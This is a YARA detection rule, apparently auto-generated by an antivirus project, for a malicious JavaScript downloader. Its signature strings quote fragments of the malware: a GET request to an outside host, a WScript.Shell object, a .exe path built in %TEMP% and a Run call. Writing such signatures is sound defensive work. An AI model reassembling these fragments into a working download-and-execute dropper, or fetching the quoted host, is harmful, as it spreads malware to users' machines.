rule sig_20160330_d4957b60740f1bec30fddf1d62f0feb6 {
  meta:
    description = "datamaliciousorder - file 20160330_d4957b60740f1bec30fddf1d62f0feb6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bb0ba7c98650465ed61d795b1e84e5446ff954722d14f6e56f29ae8487b6aea8"

  strings:
    $s1  = "YE[SS](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "function Z(XR, QG0){FV = FV * 1; return XR - QG0;};" fullword ascii
    $s3  = "var QO = function KW() {return WScript[L0](\"WScript\"+\".Shell\");}(), QG = 11;" fullword ascii
    $s4  = "if (YE[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function PM() {return QO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0J0kiLIBtuDi4vk.ex\" + \"e\";};" fullword ascii
    $s6  = "function JI(){return J + \"\";};" fullword ascii
    $s7  = "function Y(SN){QO[\"Run\"](SN, FV, FV);};" fullword ascii
    $s8  = "function C() {return ((J0 == true) && (J0 == D)) ? 1 : FV;};" fullword ascii
    $s9  = "var KD = new this[\"Date\"]();" fullword ascii
    $s10 = "function FF(UD) {var PH = (1, 2, 3, 4, 5, UD); return PH;};" fullword ascii
    $s11 = "}while (BJ);" fullword ascii
    $s12 = "function L(){return L0;};" fullword ascii
    $s13 = "function FM()" fullword ascii
    $s14 = "return Z(DT, EA);" fullword ascii
    $s15 = "function KY(){return 22;};" fullword ascii
    $s16 = "var J0 = false;" fullword ascii
    $s17 = "var F = false;" fullword ascii
    $s18 = "J0 = true; " fullword ascii
    $s19 = "} catch(XV){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}